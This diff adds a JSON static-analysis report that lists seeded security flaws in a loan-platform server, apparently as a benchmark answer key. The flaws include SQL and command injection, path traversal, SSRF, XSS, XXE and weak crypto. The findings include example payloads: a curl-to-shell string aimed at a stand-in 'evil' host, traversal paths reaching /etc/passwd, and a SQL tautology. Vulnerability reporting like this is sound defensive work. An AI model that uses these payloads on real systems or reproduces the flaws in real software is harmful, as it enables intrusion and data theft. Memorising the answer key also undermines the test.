@@ -1,0 +1,705 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.jwt-alg-none-bypass",
+      "path": "server/src/controllers/auditLogController.ts",
+      "start": {
+        "line": 77,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 77,
+        "col": 100,
+        "offset": 0
+      },
+      "extra": {
+        "message": "serveAuditRecordForPartner verifies the partner feed token with jwt.verify(token, PARTNER_FEED_SECRET, { algorithms: ['HS256', 'none'] }). Allowing the 'none' algorithm lets an attacker craft an unsigned JWT (header {\"alg\":\"none\"}) with any entityType claim and bypass authentication entirely, gaining access to any audit log entityType without ever knowing PARTNER_FEED_SECRET. A hardened counterpart (serveAuditRecordForPartnerVerified) exists right below that restricts algorithms to ['HS256'], confirming this is the vulnerable path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function",
+      "path": "server/src/controllers/decisionController.ts",
+      "start": {
+        "line": 256,
+        "col": 21,
+        "offset": 0
+      },
+      "end": {
+        "line": 256,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCustomPricingAdjustment builds `new Function('context', `with (context) { return ${rule}; }`)(context)` where `rule` comes directly from req.query.rule. This executes arbitrary attacker-supplied JavaScript on the server with full access to the Node.js runtime (e.g. `require('child_process').execSync(...)`), resulting in remote code execution. A safe counterpart (previewCustomPricingAdjustmentSafely) uses an allowlisted rule-id map instead, confirming the unsafe path is the vulnerability.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-shell-spawn",
+      "path": "server/src/controllers/importExportController.ts",
+      "start": {
+        "line": 289,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 293,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderApplicationDossier builds a shell command string with the `preset` route parameter interpolated directly (`wkhtmltopdf --preset ${preset} ...`) and executes it via `spawn('sh', ['-c', cmd], { shell: true })`. An attacker can supply a preset value like `x; curl http://evil/sh|sh #` to execute arbitrary OS commands. The scoped counterpart (renderApplicationDossierScoped) validates preset against DOSSIER_PRESETS and passes args as an array with shell:false, confirming this is the vulnerable path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-query",
+      "path": "server/src/controllers/importExportController.ts",
+      "start": {
+        "line": 167,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 172,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportApplicationsByCustomFilter builds a raw SQL query with `searchTerm` interpolated inside a string literal (`WHERE purpose ILIKE '%${searchTerm}%'`) and `sortColumn` interpolated directly as the ORDER BY column (`ORDER BY \"${column}\"`), both taken unsanitized from req.query. An attacker can break out of the string literal or inject via the column name to run arbitrary SQL. The 'Safe' counterpart parameterizes the search term and validates the column against an allowlist, confirming this version is the vulnerability.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-querybuilder-string-concat",
+      "path": "server/src/controllers/loanApplicationController.ts",
+      "start": {
+        "line": 594,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 594,
+        "col": 65,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchApplicationsByCriteria iterates over an attacker-supplied `filters` object from req.body and calls `qb.andWhere(\\`app.${field} = '${value}'\\`)`, concatenating both the field name and value directly into the SQL WHERE clause with no parameterization or allowlist. This allows arbitrary SQL injection through either the field name or the value (e.g. `value: \"' OR '1'='1\"`). The 'Safe' counterpart (searchApplicationsByCriteriaSafe) validates field names against SEARCHABLE_CRITERIA_FIELDS and uses parameterized queries.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-orderby-from-untrusted-xml-cookie",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 429,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 444,
+        "col": 62,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyDocumentListLayout parses an attacker-controlled 'caseViewLayout' cookie as XML and takes `view.sortBy` from it, then passes it unsanitized into `qb.orderBy(\\`doc.${layout.sortBy}\\`, 'DESC')`. Since ORDER BY column names cannot be parameterized, an attacker who controls the cookie can inject arbitrary SQL fragments into the generated query. The 'Safely' counterpart restricts sortBy to a fixed allowlist (['createdAt','status','category']), confirming this is the vulnerable path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-authentication-portfolio-metrics",
+      "path": "server/src/routes/applications.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 65,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `/api/applications/portfolio-metrics` route is registered without the `authenticate` middleware (unlike every other route in this file, including the near-identical `/staff-portfolio-metrics` which requires admin/underwriter). getPortfolioMetrics (loanApplicationController.ts lines 313-342) returns every loan application's borrower email, business name, loan amount, status, and risk tier to any unauthenticated caller, exposing sensitive borrower PII and business data with no login required.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-write-cookie-draftid",
+      "path": "server/src/controllers/lendingProductController.ts",
+      "start": {
+        "line": 43,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 44,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "cacheDisclosureDraft reads `draftId` directly from the unsanitized 'disclosureDraftId' cookie and joins it into a file path (`path.join(draftDir, \\`${draftId}.html\\`)`) before writing attacker-supplied `content` to it with fs.writeFileSync. Because draftId is never passed through path.basename (unlike the sibling cacheDisclosureTemplate function, which does), an attacker can set the cookie to a traversal sequence like `../../../../var/www/html/shell` to write arbitrary content to arbitrary paths on disk.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.archive-copy-retrieval",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 342,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 342,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "retrieveArchivedDocumentCopy joins the `folder` and `fileName` query parameters directly into a filesystem path (`path.join('archive', doc.applicationId, folder, fileName)`) with no normalization or containment check, then reads and returns the file contents. An attacker (any authenticated user with access to the document, including a borrower on their own application) can supply `folder=../../../../etc` and `fileName=passwd` to read arbitrary files outside the archive directory. The 'Scoped' counterpart resolves the path and verifies it stays within the archive root.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.document-template-cookie-locale",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 53,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 54,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getDocumentTemplate reads `workspaceLocale` directly from the unsanitized 'workspaceLocale' cookie and joins it into a filesystem path (`path.join('templates', workspaceLocale, \\`${category}.html\\`)`) which is then read with fs.readFileSync and returned as HTML. Because the cookie value is never sanitized with path.basename, an attacker can set it to a traversal sequence (e.g. `../../../../etc`) to read arbitrary files on the server, which are then served back as the HTTP response body.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.attachment-upload-originalname",
+      "path": "server/src/controllers/messageController.ts",
+      "start": {
+        "line": 132,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 133,
+        "col": 45,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadMessageAttachment writes the uploaded file using the client-supplied `req.file.originalname` directly as the destination filename (`path.join(attachmentDir, req.file.originalname)`) with no sanitization. Since multer preserves the client-provided filename verbatim, an attacker can set the multipart filename to a traversal sequence (e.g. `../../../../server/src/index.js`) to write the uploaded content outside the intended `public/message-attachments` directory. The 'Validated' counterpart generates a random UUID-based filename instead.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.webhook-template-preview",
+      "path": "server/src/controllers/webhookController.ts",
+      "start": {
+        "line": 63,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 63,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewWebhookPayloadTemplate joins the `eventType` route parameter directly into a filesystem path (`path.join(PAYLOAD_TEMPLATE_ROOT, \\`${eventType}.json\\`)`) with no validation before reading and returning the file. Because Express decodes percent-encoded path segments (e.g. `%2e%2e%2f`) before handing them to the handler as `req.params.eventType`, an admin-authenticated caller can supply an encoded traversal sequence to read files outside webhook-templates. The 'Scoped' counterpart resolves the path and checks it stays within the template root.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.webhook-test-ping-unrestricted-target",
+      "path": "server/src/controllers/webhookController.ts",
+      "start": {
+        "line": 100,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 103,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sendWebhookTestPing takes the target URL for a server-side POST request from the client-controlled `x-test-endpoint` header with no validation whatsoever (`const targetUrl = ... overrideUrl ... : hook.url; fetch(targetUrl, ...)`), and the response status/body is reflected back to the caller. This allows an admin-authenticated attacker to make the server issue requests to arbitrary internal hosts (e.g. cloud metadata endpoints, internal admin panels) and observe responses via the delivered/status fields. The 'Safe' counterpart restricts the override host to TEST_ENDPOINT_HOST_ALLOWLIST.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.cookie-value-into-inline-script",
+      "path": "server/src/controllers/lendingProductController.ts",
+      "start": {
+        "line": 73,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 73,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getEmbeddableCalculatorWidget takes `displayLabel` directly from the unsanitized 'widgetDisplayLabel' cookie and interpolates it into an inline <script> block returned as HTML: `<script>window.__loanWidget = { ..., label: \"${displayLabel}\" };</script>`. An attacker who can set this cookie in the victim's browser (or via a subdomain/related-site cookie injection) can break out of the string literal to inject arbitrary JavaScript that executes in the context of any page embedding this widget. The sibling getEmbeddableRateNotice function escapes the same kind of cookie value via escapeForScript(), confirming this path is the vulnerability.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.header-controlled-redirect",
+      "path": "server/src/controllers/notificationController.ts",
+      "start": {
+        "line": 74,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 75,
+        "col": 34,
+        "offset": 0
+      },
+      "extra": {
+        "message": "acknowledgeAndReturn redirects the authenticated user to whatever URL is supplied in the `x-redirect-url` request header (falling back to Referer) with no validation: `res.redirect(returnTo)`. An attacker can craft a link/form that triggers this endpoint with a custom header (or rely on a malicious Referer) to redirect victims to an attacker-controlled phishing site. The 'Safe' counterpart validates the destination against ALLOWED_RETURN_DESTINATIONS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.deserialization.mass-assignment-arbitrary-fields",
+      "path": "server/src/controllers/userController.ts",
+      "start": {
+        "line": 96,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 97,
+        "col": 34,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyDirectorySyncPayload parses an arbitrary JSON blob from the `payload` query parameter and merges every key directly onto the User entity with `Object.assign(user, delta)` before saving, with no schema validation or field allowlist. A caller of this endpoint can set any User column \u2014 including `role`, `passwordHash`, `isActive`, or `email` \u2014 on the target account. The 'Validated' counterpart parses the payload through a strict zod schema restricted to firstName/lastName.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-password-hash-sha256",
+      "path": "server/src/controllers/authController.ts",
+      "start": {
+        "line": 220,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 221,
+        "col": 63,
+        "offset": 0
+      },
+      "extra": {
+        "message": "initializeReferralAccount stores the account's password using an unsalted, single-round SHA-256 hash (`crypto.createHash('sha256').update(tempPassword).digest('hex')`) instead of the project's standard bcrypt-based hashPassword() (used everywhere else, including the sibling initializeVerifiedReferralAccount). SHA-256 is fast to compute and has no per-user salt, making the resulting hashes trivially crackable via rainbow tables or brute force if the users table is ever exfiltrated.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.insecure-randomness-recovery-code",
+      "path": "server/src/controllers/authController.ts",
+      "start": {
+        "line": 123,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 123,
+        "col": 63,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sendAccountRecoveryLink generates the account-recovery code using `Math.random().toString(36).substring(2, 15)`, a non-cryptographic PRNG that is predictable and has been shown to be seed-recoverable from a small number of outputs in V8. Since this code is the sole credential required by completeAccountRecovery to reset a user's password, a predictable value undermines the entire recovery flow, allowing account takeover.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.session-fixation-no-regenerate-after-recovery",
+      "path": "server/src/controllers/authController.ts",
+      "start": {
+        "line": 153,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 169,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "completeAccountRecoveryAndSignIn authenticates the user after a successful password reset by setting `req.session.userId = user.id` on the existing session, without first calling `req.session.regenerate()`. If an attacker was able to fix/know the victim's pre-authentication session ID (session fixation), this reuse of the same session id upon login grants the attacker an authenticated session. The sibling completeAccountRecoveryAndSignInSecurely function calls `req.session.regenerate()` before assigning userId, confirming this is the intended fix that is missing here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.plaintext-bank-account-storage",
+      "path": "server/src/controllers/payoutController.ts",
+      "start": {
+        "line": 30,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 35,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachPayoutAccount stores the borrower's bank `routingNumber` and `accountNumber` in the disbursement_accounts table completely in plaintext. The sibling attachPayoutAccountEncrypted function encrypts the account number with AES-256-GCM via the platform secrets manager before storing it, confirming plaintext storage of this sensitive financial data is the unintended, insecure path (a database compromise or read-only SQL access directly discloses full bank account numbers).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.stack-trace-in-response",
+      "path": "server/src/controllers/importExportController.ts",
+      "start": {
+        "line": 41,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generatePortfolioSummary catches any error and responds with `res.status(500).json({ error: err.message, stack: err.stack })`, returning the full server-side stack trace (file paths, module structure) directly to the client. The sibling generateComplianceSummary function instead logs the error server-side and returns only an opaque errorId, showing the intended safe pattern.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.stack-trace-via-trace-mode",
+      "path": "server/src/controllers/decisionController.ts",
+      "start": {
+        "line": 223,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 224,
+        "col": 82,
+        "offset": 0
+      },
+      "extra": {
+        "message": "simulateDecisionOutcome exposes the full error message, stack trace, and request context to the client whenever the caller passes `mode=trace` in the query string, with no environment gating. The sibling simulateDecisionOutcomeSafely function gates any error logging behind `NODE_ENV === 'development'` and never includes stack traces in the HTTP response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.xml-parsing-of-untrusted-cookie-data",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 429,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 430,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyDocumentListLayout base64-decodes the attacker-controlled 'caseViewLayout' cookie and parses it as XML with `new GenericMarkupParser().parseStringPromise(markup)` using default (permissive) options, with no check for DOCTYPE/ENTITY declarations before parsing. The 'Safely' counterpart explicitly rejects input containing `<!DOCTYPE` or `<!ENTITY` before parsing, indicating the project treats unrestricted XML parsing of this attacker-controlled input as unsafe.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.legacy-queue-layout-xml-parsing",
+      "path": "server/src/controllers/reviewContinuityController.ts",
+      "start": {
+        "line": 110,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 111,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importLegacyQueueLayout base64-decodes the attacker-controlled 'legacyQueueLayoutXml' cookie and parses it as XML with default parser options and no DOCTYPE/ENTITY guard, unlike importLegacyQueueLayoutSafely which rejects input containing `<!DOCTYPE` or `<!ENTITY` before parsing.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.cors-reflects-any-origin",
+      "path": "server/src/controllers/lendingProductController.ts",
+      "start": {
+        "line": 96,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 99,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getPartnerRateFeed reflects the incoming `Origin` header verbatim into `Access-Control-Allow-Origin` for any caller, with no allowlist check, allowing any website to make cross-origin reads of this endpoint's response. The 'Verified' counterpart only sets the CORS header when the product is marked partnerEmbeddable and the Origin matches the product's registered partnerDomain.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-16: Configuration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.missing-security-flags-sensitive-token",
+      "path": "server/src/controllers/payoutController.ts",
+      "start": {
+        "line": 108,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 108,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "issueVendorStatusPass sets the sensitive `vendorStatusPass` bearer token cookie with only a maxAge option \u2014 no httpOnly, secure, or sameSite attributes \u2014 so the token is readable by client-side JavaScript (XSS exfiltration), sent over plain HTTP, and attached to cross-site requests. The 'Secure' counterpart sets httpOnly, secure (in production), and sameSite: 'strict'.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.missing-security-flags-oauth-token",
+      "path": "server/src/controllers/marketplaceLinkController.ts",
+      "start": {
+        "line": 25,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "completeMarketplaceLink stores the accounting-partner OAuth access token in the `marketplaceSession` cookie with only a maxAge option, missing httpOnly, secure, and sameSite flags, unlike completeMarketplaceLinkSecure which sets all three. This exposes a live third-party access token to theft via XSS or network interception.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.secret-fallback-defaults",
+      "path": "server/src/index.ts",
+      "start": {
+        "line": 45,
+        "col": 12,
+        "offset": 0
+      },
+      "end": {
+        "line": 45,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The express-session secret falls back to the hardcoded literal `'change-me-in-production'` when SESSION_SECRET is unset. Similar hardcoded fallback secrets exist for PARTNER_FEED_SECRET ('partner-audit-feed-signing-key', auditLogController.ts:10) and PARTNER_PASS_SECRET ('partner-viewing-pass-signing-key', loanApplicationController.ts:17). If any of these environment variables are not set in a deployed environment, the server silently runs with a publicly-known secret, allowing session or token forgery.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
